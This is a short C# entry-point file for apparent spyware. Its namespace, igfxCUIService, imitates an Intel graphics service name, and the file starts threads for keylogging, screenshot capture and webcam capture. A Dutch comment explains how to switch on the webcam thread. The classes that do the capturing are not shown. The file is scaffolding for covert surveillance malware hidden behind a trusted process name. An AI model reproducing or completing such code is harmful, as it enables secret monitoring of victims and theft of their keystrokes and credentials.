using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace igfxCUIService
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        private static Thread o1 = new Thread(Keylogger.Logger);
        private static Thread o2 = new Thread(Screenshots.Aantalscreenshots);
        private static Thread o3 = new Thread(Webcam.Aantalwebshots);
        [STAThread]
        static void Main(string[] args)
        { 
                //o1.Start();
                o2.Start();
                //o3.Start(); // om webcam shots temaken haal de eersen 2 / weg
        }
    }
}
